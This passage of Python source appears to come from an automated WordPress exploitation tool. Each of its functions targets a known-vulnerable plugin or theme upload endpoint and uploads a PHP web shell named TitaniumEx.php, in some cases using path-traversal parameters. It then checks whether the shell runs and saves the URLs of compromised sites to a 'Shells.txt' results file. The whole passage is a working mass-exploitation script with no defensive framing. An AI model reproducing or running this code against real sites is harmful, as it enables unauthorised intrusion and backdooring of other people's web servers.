        upload_dir = url +'/wp-content/uploads/assignments/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X169(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/wp-mobile-detector/resize.php"
        upload_dir = url +'/wp-content/plugins/wp-mobile-detector/cache/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X170(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/developer-tools/libs/swfupload/upload.php"
        upload_dir = url +'/wp-content/plugins/developer-tools/libs/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X171(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/genesis-simple-defaults/uploadFavicon.php"
        upload_dir = url +'/wp-content/uploads/favicon/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X172(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'files':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/acf-frontend-display/js/blueimp-jQuery-File-Upload-d45deb1/server/php/index.php"
        upload_dir = url +'/wp-content/uploads/uigen_'+str(x.year)+'/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X173(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'uploadfile':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/pica-photo-gallery/picaPhotosResize.php"
        upload_dir = url +'/wp-content/plugins/pica-photo-gallery/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X174(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'wpshop_file':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload"
        upload_dir = url +'/wp-content/uploads/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X175(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'files[]':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php"
        upload_dir = url +'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X176(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'qqfile':open (php, 'rb')}
        postdir = url +'/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year='+str(x.year)+'&Month='+str(x.month)
        upload_dir = url +'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X177(url):
    try:
        php = "files/TitaniumEx.php"
        payload = {'config_path':'../../../../../../'}
        data = {'image':open (php, 'rb')}
        postdir = url +'/wp-content/plugins/social-networking-e-commerce-1/classes/views/social-options/form_cat_add.php'
        upload_dir = url +'/wp-content/plugins/social-networking-e-commerce-1/images/uploads/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,data=payload,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X178(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'uploadfile':open (php, 'rb')}
        payload = {'value': './'}
        postdir = url +'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-black/designit/cs/upload.php'
        upload_dir = url +'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-black/designit/cs/uploadImage/'+tok[0]+'.php'
        xex = requests.post(postdir,files=data,data=payload,headers=headers,verify=False,timeout=5)
        tok = re.findall('(.*?).php', xex.text)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X179(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        postdir = url +'/wp-content/plugins/php-event-calendar/server/file-uploader/'
        upload_dir = url +'/wp-content/plugins/php-event-calendar/server/file-uploader/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X180(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        postdir = url +'/wp-content/plugins/php-event-calendar/server/file-uploader/'
        upload_dir = url +'/wp-content/plugins/php-event-calendar/server/file-uploader/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X181(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +'/wp-admin/admin.php?page=blaze_manage'
        upload_dir = url +'/wp-content/uploads/blaze/uploadfolder/big/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X182(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'fileToUpload':open (php, 'rb')}
        postdir = url +'/wp-content/plugins/wp-symposium/js/uploadify/uploadify.php'
        upload_dir = url +'/wp-content/uploads/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X183(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'wpcsp_file':open (php, 'rb')}
        payload = {'upload_path': '../../../../uploads/'}
        postdir = url +'/wp-content/plugins/wp-copysafe-pdf/lib/uploadify/uploadify.php'
        upload_dir = url +'/wp-content/uploads/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,data=payload,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X184(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +'/wp-admin/admin-ajax.php?action=wpuf_file_upload'
        upload_dir = url +'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X185(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        postdir = url +'/wp-content/plugins/mobile-friendly-app-builder-by-easytouch/server/images.php'
        upload_dir = url +'/wp-content/plugins/mobile-friendly-app-builder-by-easytouch/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X186(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +'/wp-content/plugins/viral-optins/api/uploader/file-uploader.php'
        upload_dir = url +'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X187(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +'/wp-content/plugins/omni-secure-files/plupload/examples/upload.php'
        upload_dir = url +'/wp-content/plugins/omni-secure-files/plupload/examples/uploads/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X188(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +'/wp-content/plugins/wp-checkout/vendors/uploadify/upload.php'
        upload_dir = url +'/wp-content/uploads/wp-checkout/uploadify/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X189(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +'/wp-content/themes/purevision/scripts/admin/uploadify/uploadify.php'
        upload_dir = url +'/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
